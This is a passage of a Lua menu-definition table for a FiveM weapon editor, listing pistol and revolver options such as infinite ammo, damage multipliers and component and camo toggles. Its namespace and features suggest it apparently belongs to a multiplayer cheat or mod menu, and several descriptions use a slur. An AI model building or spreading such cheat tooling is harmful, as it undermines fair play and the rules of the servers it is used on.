            {text = 'Vip variant', dkey = 'weapon:revolver_vipvariant', desc = 'Enable the vip variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_VARMOD_BOSS`},
            {text = 'Bodyguard variant', dkey = 'weapon:revolver_bodyguardvariant', desc = 'Enable the bodyguard variant.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_VARMOD_GOON`},
        },
        
        ['weapon:snspistol'] = {
            {text = 'Set ammo', dkey = 'weapon:snspistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:snspistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:snspistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:snspistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:snspistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:snspistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:snspistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_CLIP_02`},
            {text = 'Wood grip finish', dkey = 'weapon:snspistol_woodgripfinish', desc = 'Enable the wood grip finish.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false,extra = `COMPONENT_SNSPISTOL_VARMOD_LOWRIDER`},
        },
        
        ['weapon:heavypistol'] = {
            {text = 'Set ammo', dkey = 'weapon:heavypistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:heavypistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:heavypistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:heavypistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:heavypistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:heavypistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYPISTOL_CLIP_02`},
            {text = 'Flashlight', dkey = 'weapon:heavypistol_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Suppressor', dkey = 'weapon:heavypistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
            {text = 'Wood grip finish', dkey = 'weapon:heavypistol_woodgripfinish', desc = 'Enable the wood grip finish.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_HEAVYPISTOL_VARMOD_LUXE`},
        },
        
        ['weapon:revolver_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:revolver_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:revolver_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:revolver_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:revolver_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:revolver_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Default rounds', dkey = 'weapon:revolver_mk2_defaultround', desc = 'Enable the default rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CLIP_01`},
            {text = 'Tracer rounds', dkey = 'weapon:revolver_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:revolver_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY`},
            {text = 'Hollow point rounds', dkey = 'weapon:revolver_mk2_hollowpointrounds', desc = 'Enable the hollow point rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT`},
            {text = 'Metal jacket rounds', dkey = 'weapon:revolver_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CLIP_FMJ`},
            {text = 'Holographic sight', dkey = 'weapon:revolver_mk2_holographicsight', desc = 'Enable the holographic sight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SIGHTS`},
            {text = 'Small scope', dkey = 'weapon:revolver_mk2_smallscope', desc = 'Enable the small scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_SCOPE_MACRO_MK2`},
            {text = 'Flashlight', dkey = 'weapon:revolver_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH`},
            {text = 'Compensator', dkey = 'weapon:revolver_mk2_compensator', desc = 'Enable the compensator.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_COMP_03`},
            {text = 'Digital camo', dkey = 'weapon:revolver_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:revolver_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:revolver_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:revolver_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:revolver_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:revolver_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:revolver_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:revolver_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:revolver_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:revolver_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:revolver_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_REVOLVER_MK2_CAMO_IND_01`},
        },
        
        ['weapon:snspistol_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:snspistol_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:snspistol_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:snspistol_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:snspistol_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:snspistol_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:snspistol_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:snspistol_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:snspistol_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:snspistol_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_INCENDIARY`},
            {text = 'Hollow point rounds', dkey = 'weapon:snspistol_mk2_hollowpointrounds', desc = 'Enable the hollow point rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_HOLLOWPOINT`},
            {text = 'Metal jacket rounds', dkey = 'weapon:snspistol_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:snspistol_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH_03`},
            {text = 'Mounted scope', dkey = 'weapon:snspistol_mk2__mountedscope', desc = 'Enable the mounted scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_RAIL_02`},
            {text = 'Suppressor', dkey = 'weapon:snspistol_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP_02`},
            {text = 'Compensator', dkey = 'weapon:snspistol_mk2_compensator', desc = 'Enable the compensator.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_COMP_02`},
            {text = 'Digital camo', dkey = 'weapon:snspistol_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:snspistol_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:snspistol_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:snspistol_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:snspistol_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:snspistol_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:snspistol_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:snspistol_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:snspistol_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weaponsnspistol_mk2:_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:snspistol_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_SNSPISTOL_MK2_CAMO_IND_01`},
        },
        
        ['weapon:pistol_mk2'] = {
            {text = 'Set ammo', dkey = 'weapon:pistol_mk2_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:pistol_mk2_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:pistol_mk2_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:pistol_mk2_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:pistol_mk2_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:pistol_mk2_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:pistol_mk2_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_02`},
            {text = 'Tracer rounds', dkey = 'weapon:pistol_mk2_tracerrounds', desc = 'Enable the tracer rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_TRACER`},
            {text = 'Incendiary rounds', dkey = 'weapon:pistol_mk2_incendiaryrounds', desc = 'Enable the incendiary rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_INCENDIARY`},
            {text = 'Hollow point rounds', dkey = 'weapon:pistol_mk2_hollowpointrounds', desc = 'Enable the hollow point rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_HOLLOWPOINT`},
            {text = 'Metal jacket rounds', dkey = 'weapon:pistol_mk2_metaljacketrounds', desc = 'Enable the metal jacket rounds.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CLIP_FMJ`},
            {text = 'Flashlight', dkey = 'weapon:pistol_mk2_flashlight', desc = 'Enable the flashlight.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_FLSH_02`},
            {text = 'Mounted scope', dkey = 'weapon:pistol_mk2_mountedscope', desc = 'Enable the mounted scope.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_RAIL`},
            {text = 'Suppressor', dkey = 'weapon:pistol_mk2_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP_02`},
            {text = 'Compensator', dkey = 'weapon:pistol_mk2_compensator', desc = 'Enable the compensator.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_COMP`},
            {text = 'Digital camo', dkey = 'weapon:pistol_mk2_digitalcamo', desc = 'Enable the digital camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO`},
            {text = 'Bruhstroke camo', dkey = 'weapon:pistol_mk2_bruhstrokecamo', desc = 'Enable the bruhstroke camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_02`},
            {text = 'Woodland camo', dkey = 'weapon:pistol_mk2_woodlandcamo', desc = 'Enable the woodland camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_03`},
            {text = 'Skull camo', dkey = 'weapon:pistol_mk2_skullcamo', desc = 'Enable the skull camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_04`},
            {text = 'Sessanta nove camo', dkey = 'weapon:pistol_mk2_sessantanovecamo', desc = 'Enable the sessanta nove camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_05`},
            {text = 'Perseus camo', dkey = 'weapon:pistol_mk2_perseuscamo', desc = 'Enable the perseus camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_06`},
            {text = 'Leopard camo', dkey = 'weapon:pistol_mk2_leopardcamo', desc = 'Enable the leopard camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_07`},
            {text = 'Zebra camo', dkey = 'weapon:pistol_mk2_zebracamo', desc = 'Enable the zebra camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_08`},
            {text = 'Geometric camo', dkey = 'weapon:pistol_mk2_geometriccamo', desc = 'Enable the geometric camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_09`},
            {text = 'Boom camo', dkey = 'weapon:pistol_mk2_boomcamo', desc = 'Enable the boom camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_10`},
            {text = 'Patriotic camo', dkey = 'weapon:pistol_mk2_patrioticcamo', desc = 'Enable the patriotic camo.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_PISTOL_MK2_CAMO_IND_01`},
        },
        
        ['weapon:vintagepistol'] = {
            {text = 'Set ammo', dkey = 'weapon:vintagepistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:vintagepistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Set ammo in clip', dkey = 'weapon:vintagepistol_setammoinclip', desc = 'Set the ammo in the current clip.\nFivem is retarded so this doesn\'t\nwork with extended clips.', afu = __REAPER1__.M.weapon.editor.setammoinclip, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo in clip number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Infinite ammo', dkey = 'weapon:vintagepistol_infinite', desc = 'Enable infinite ammo in this weapon.', afu = __REAPER1__.M.weapon.editor.infinite, option = __REAPER1__.M.Checkbox, func = false},
            {text = 'Damage multiplier', dkey = 'weapon:vintagepistol_damage', desc = 'Set the damage multiplier number\non this weapon.', afu = __REAPER1__.M.weapon.editor.damage, option = __REAPER1__.M.Button_Textbox, textboxtext = 'Damage multiplier number', length = 20, tipus = 'szam', func = '1.0'},
            {text = 'Components', option = __REAPER1__.M.Separator},
            {text = 'Clip', dkey = 'weapon:vintagepistol_clip', desc = 'Enable the default clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_VINTAGEPISTOL_CLIP_01`},
            {text = 'Extended clip', dkey = 'weapon:vintagepistol_extendedclip', desc = 'Enable the extended clip.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_VINTAGEPISTOL_CLIP_02`},
            {text = 'Suppressor', dkey = 'weapon:vintagepistol_suppressor', desc = 'Enable the suppressor.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_AT_PI_SUPP`},
        },
        
        ['weapon:raypistol'] = {
            {text = 'Festive tint', dkey = 'weapon:raypistol_festivetintr', desc = 'Enable the festive tint.', afu = __REAPER1__.M.weapon.editor.component, option = __REAPER1__.M.Checkbox, func = false, extra = `COMPONENT_RAYPISTOL_VARMOD_XMAS18`},
        },
        
        ['weapon:ceramicpistol'] = {
            {text = 'Set ammo', dkey = 'weapon:ceramicpistol_setammo', desc = 'Set the overall ammunation in this\nweapon.', afu = __REAPER1__.M.weapon.editor.setammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
            {text = 'Add ammo', dkey = 'weapon:ceramicpistol_addammo', desc = 'Add an overall amount of\nammunation to the current one.', afu = __REAPER1__.M.weapon.editor.addammo, option = __REAPER1__.M.Combo, cindex = 1, sindex = 1, textboxtext = 'Ammo number', length = 4, tipus = 'szam', func = __REAPER1__.T.EzresNullaval},
